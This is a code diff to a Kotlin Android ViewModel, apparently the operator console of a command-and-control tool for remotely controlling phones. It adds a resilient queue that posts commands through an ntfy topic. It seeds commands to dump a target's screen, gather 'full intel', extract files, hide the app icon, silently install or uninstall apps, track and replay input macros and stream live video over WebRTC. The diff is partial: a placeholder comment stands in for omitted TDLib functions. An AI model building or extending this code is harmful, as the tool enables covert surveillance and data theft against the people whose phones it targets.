@@ -8,6 +8,10 @@ import android.content.IntentFilter
 import android.hardware.camera2.CameraManager
 import android.location.LocationManager
 import android.media.AudioManager
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Environment
@@ -20,15 +24,21 @@ import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.c2c.data.local.AppDatabase
 import com.c2c.data.local.CommandEntity
-import com.c2c.domain.CommandEngine
 import com.c2c.webrtc.WebRtcManager
 import io.ktor.client.HttpClient
 import io.ktor.client.engine.cio.CIO
+import io.ktor.client.request.post
+import io.ktor.client.request.setBody
 import io.ktor.websocket.Frame
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.channels.Channel
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.flow.first
+import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.drinkless.tdlib.Client
@@ -42,6 +52,8 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
+data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String)
+
 class CoreViewModel(application: Application) : AndroidViewModel(application) {
     
     private val appCtx = application
@@ -51,13 +63,19 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private val commandDao = database.commandDao()
     private val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
     
-    val commandEngine = CommandEngine(application, httpClient)
     val webRtcManager = WebRtcManager(application) { sdpJsonString ->
         sendLive("webrtc_signaling", sdpJsonString)
     }
 
     private val _commands = MutableStateFlow<List<CommandEntity>>(emptyList())
     val commands: StateFlow<List<CommandEntity>> = _commands.asStateFlow()
+
+    // --- Resilient Queue Engine State ---
+    private val _pendingCommands = MutableStateFlow<Set<String>>(emptySet())
+    val pendingCommands = _pendingCommands.asStateFlow()
+    private var commandQueue = Channel<QueuedCommand>(Channel.UNLIMITED)
+    private var workerJob: Job? = null
+    private val isNetworkAvailable = MutableStateFlow(true)
 
     var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)
 
@@ -80,6 +98,8 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     init {
         webRtcManager.initialize()
         loadLocalChatHistory()
+        monitorNetwork()
+        startQueueWorkers()
 
         viewModelScope.launch(Dispatchers.IO) {
             commandDao.getAllCommands().collect { list ->
@@ -104,10 +124,76 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    fun executeCommand(cmd: String, arg: String = "") {
-        commandEngine.enqueue(cmd, arg)
+    // --- Resilient Queue Engine ---
+    private fun monitorNetwork() {
+        val connectivityManager = appCtx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val request = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
+        connectivityManager.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) { isNetworkAvailable.value = true }
+            override fun onLost(network: Network) { isNetworkAvailable.value = false }
+        })
     }
 
+    private fun startQueueWorkers() {
+        workerJob?.cancel()
+        commandQueue.cancel()
+        commandQueue = Channel(Channel.UNLIMITED)
+        _pendingCommands.value = emptySet()
+
+        workerJob = viewModelScope.launch(Dispatchers.IO) {
+            // Strictly 3 parallel executors
+            repeat(3) {
+                launch {
+                    for (task in commandQueue) {
+                        processTask(task)
+                    }
+                }
+            }
+        }
+    }
+
+    private suspend fun processTask(task: QueuedCommand) {
+        var success = false
+        while (!success) {
+            // Abort if killed by Kill Switch
+            if (!_pendingCommands.value.contains(task.uiKey)) return
+
+            isNetworkAvailable.first { it }
+            try {
+                val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
+                val topic = prefs.getString("ntfyTopic", "default_topic")!!
+                val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
+                
+                val payload = if (task.arg.isNotBlank()) {
+                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}", "arg": "${task.arg.replace("\"", "\\\"")}"}"""
+                } else {
+                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}"}"""
+                }
+
+                httpClient.post(targetUrl) { setBody(payload) }
+                success = true
+                ServerCore.log("SENT: ${task.cmd}", true)
+            } catch (e: Exception) {
+                ServerCore.log("NETWORK DROP: ${task.cmd} paused. Retrying...", false)
+                delay(3000) // Backoff before retry
+            }
+        }
+        _pendingCommands.update { it - task.uiKey }
+    }
+
+    // Command API
+    fun executeCommand(cmd: String, arg: String = "", uiKey: String = cmd) {
+        _pendingCommands.update { it + uiKey }
+        commandQueue.trySend(QueuedCommand(uiKey, cmd, arg))
+        ServerCore.log("QUEUED: $cmd")
+    }
+
+    fun activateKillSwitch() {
+        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue.", false)
+        startQueueWorkers()
+    }
+
+    // --- Database Operations ---
     fun addCommand(label: String, cmd: String, arg: String, icon: String) {
         viewModelScope.launch(Dispatchers.IO) {
             commandDao.insertCommand(CommandEntity(label = label, cmd = cmd, defaultArg = arg, icon = icon))
@@ -120,13 +206,36 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
+    private suspend fun seedDefaultCommands() {
+        val defaults = listOf(
+            CommandEntity(label = "Ping Target", cmd = "ping", defaultArg = "", icon = "radar"),
+            CommandEntity(label = "Full Intel", cmd = "info", defaultArg = "", icon = "info"),
+            CommandEntity(label = "Dump Screen", cmd = "dump_screen", defaultArg = "", icon = "screenshot_monitor"),
+            CommandEntity(label = "Track Macro", cmd = "track_activity", defaultArg = "10, temp_macro", icon = "track_changes"),
+            CommandEntity(label = "Perform Macro", cmd = "perform", defaultArg = "2, 1, temp_macro", icon = "play_arrow"),
+            CommandEntity(label = "Workflow Send", cmd = "workflow", defaultArg = "default", icon = "account_tree"),
+            CommandEntity(label = "WF Status", cmd = "status_workflow", defaultArg = "default", icon = "description"),
+            CommandEntity(label = "Extract File", cmd = "send", defaultArg = "filename.txt", icon = "upload_file"),
+            CommandEntity(label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi"),
+            CommandEntity(label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router"),
+            CommandEntity(label = "App Install", cmd = "install_app", defaultArg = "/sdcard/app.apk", icon = "system_update"),
+            CommandEntity(label = "App Uninstall", cmd = "uninstall_app", defaultArg = "com.whatsapp", icon = "delete_sweep"),
+            CommandEntity(label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off"),
+            CommandEntity(label = "VoIP Call", cmd = "call", defaultArg = "nm, loud", icon = "phone"),
+            CommandEntity(label = "End Call", cmd = "end_call", defaultArg = "", icon = "phone_disabled"),
+            CommandEntity(label = "Download URL", cmd = "download_url", defaultArg = "{\"url\":\"https://...\"}", icon = "cloud_download")
+        )
+        defaults.forEach { commandDao.insertCommand(it) }
+    }
+
+    // --- WebRTC ---
     fun initiateWebRtcConnection() {
         webRtcManager.createPeerConnection(isCaller = true) { stream ->
             if (stream.videoTracks.isNotEmpty()) {
                 remoteVideoTrack = stream.videoTracks[0]
             }
         }
-        executeCommand("start_webrtc", "")
+        executeCommand("start_webrtc", "", "live_rtc_init")
     }
 
     fun terminateWebRtcConnection() {
@@ -136,17 +245,8 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         sendLive("live_screen_cast", "stop")
     }
 
-    private suspend fun seedDefaultCommands() {
-        val defaults = listOf(
-            CommandEntity(label = "Flash On", cmd = "flash", defaultArg = "on", icon = "flash"),
-            CommandEntity(label = "Location", cmd = "loc", defaultArg = "", icon = "location"),
-            CommandEntity(label = "Fetch Logs", cmd = "get_log", defaultArg = "", icon = "log"),
-            CommandEntity(label = "Volume 100%", cmd = "vol", defaultArg = "100", icon = "volume_up"),
-            CommandEntity(label = "Live Start", cmd = "live_start", defaultArg = "ws://0.0.0.0:8765/live", icon = "server")
-        )
-        defaults.forEach { commandDao.insertCommand(it) }
-    }
-
+    // ... [KEEP ALL TDLib & TgMessage FUNCTIONS EXACTLY THE SAME] ...
+    
     fun tdLog(msg: String, type: String = "INFO") {
         val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
         viewModelScope.launch(Dispatchers.Main) {
